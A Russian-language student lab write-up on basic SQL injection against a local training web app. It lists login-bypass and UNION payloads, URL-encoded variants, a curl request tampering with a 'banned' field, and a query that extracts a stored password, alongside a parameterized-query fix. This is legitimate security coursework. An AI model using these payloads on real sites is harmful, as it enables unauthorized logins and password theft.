# Лабораторная работа 3
Примитивные SQL инъекции.

## Исходные данные
https://github.com/SergeyMirvoda/secure-web-development-22/tree/main/lab3

## Задание 1
Предположим, что на нашем сайте подобная форма аутентификации:

>let sql = "SELECT name as result FROM users WHERE name = '" + login + "' AND pass = '" + pass + "'";

Тогда злоумышленник может войти в систему как любой пользователь, если он знает имя пользователя, используя следующий ввод:

>Имя пользователя: test'--

Либо злоумышленник может войти в систему как первый пользователь в таблице "users", введя следующие данные:

>Имя пользователя: ' or 1=1--

Злоумышленник может войти в систему в качестве выдуманного пользователя:
>Имя пользователя: ' union select 1, 'fictional_user', 'some_password', 1--

Рекомендуется использовать следующую форму аутентификации:

>let sql = {  
    text: "SELECT name as result FROM users WHERE name = $1 AND pass = $2",  
    values: [login, pass]  
    }

## Задание 2
1. Обойти клиентскую защиту с помощью ``curl``.   
> curl 'http://localhost:8080/signin'    
  --data-raw 'name=test&pass=test&banned=**true**'  
  --compressed

## Задание 3
1. Обойти защиту с помощью кодирования кавычки в альтернативный формат (Url encoded).  

**URL encoding (hex): использование 16-ричного представления символов.**   
%27 - символ кавычки
> Взлом первого пользователя  
**%20%27%20or%201%3D1--**  
Вход в системы с помощью выдуманного пользователя
**%27%20union%20select%201%2C%20%27fictional_user%27%2C%20%27some_password%27%2C%201--**

## Задание 4
1. Обойти защиту с помощью кодирования кавычки в альтернативный формат (Url encoded) и получить пароль из БД (примеры таких строк в ссылках или презентации к лекции).  

>123%27) or 1=1 union select (select min(pass) from users) order by 1 asc limit 1--

